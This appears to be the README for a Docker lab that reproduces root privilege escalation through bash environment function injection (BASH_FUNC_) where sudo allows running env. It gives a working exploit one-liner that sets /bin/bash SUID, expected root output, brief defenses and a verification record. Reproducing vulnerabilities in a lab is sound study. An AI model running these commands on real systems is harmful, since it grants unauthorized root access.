# BASH_FUNC_ 环境函数劫持

## 原理

bash 允许通过环境变量传递**函数定义**（`export -f func`），环境变量名形如
`BASH_FUNC_func%%`。当 root 的 bash 进程继承了该环境变量时，会把变量内容解析
成函数并定义——攻击者可以把环境变量伪装成函数定义，让 root 的 bash 执行恶意
函数体。CVE-2014-6271（Shellshock）就是此类问题的极致形态。

## 环境

- 基础镜像：ubuntu:20.04
- 低权限用户：lowpriv / lowpriv123
- 漏洞配置：lowpriv 可 NOPASSWD 执行 /usr/bin/env（sudo 以 root 执行 bash 时继承环境变量）

## 复现步骤

```bash
# 1. 构建并启动
docker compose up -d --build

# 2. 进入低权限用户
docker exec -it $(docker compose ps -q) su - lowpriv

# 3. 注入函数定义 (sudo env 以 root 执行 bash, 环境变量被继承)
sudo env 'BASH_FUNC_pwn%%=() { id; chmod u+s /bin/bash; }' bash -c pwn
# 预期输出: uid=0(root) gid=0(root)   函数体以 root 执行!

# 4. 验证提权
ls -l /bin/bash
# 预期输出: -rwsr-xr-x 1 root root ... /bin/bash
/bin/bash -p -c 'id'
# 预期输出: euid=0(root)   提权成功!

# 5. 一键利用
bash exploit.sh
```

## 为什么能成功

- `env 'BASH_FUNC_pwn%%=() { ... }'` 设置环境变量
- sudo 以 root 执行 bash 时继承该变量, bash 解析出函数 pwn
- `bash -c pwn` 调用它, 函数体 `chmod u+s /bin/bash` 以 root 执行

## 防御

- sudo 场景限制 env 类命令的授权
- 对 setuid 程序严格清理环境变量

## 验证记录

2026-08-26 真实环境验证：`sudo env 'BASH_FUNC_pwn%%=() { id; chmod u+s /bin/bash; }' bash -c pwn`
输出 `uid=0(root) gid=0(root)`，/bin/bash 变 SUID，`bash -p` 得到 euid=0。复现成功。
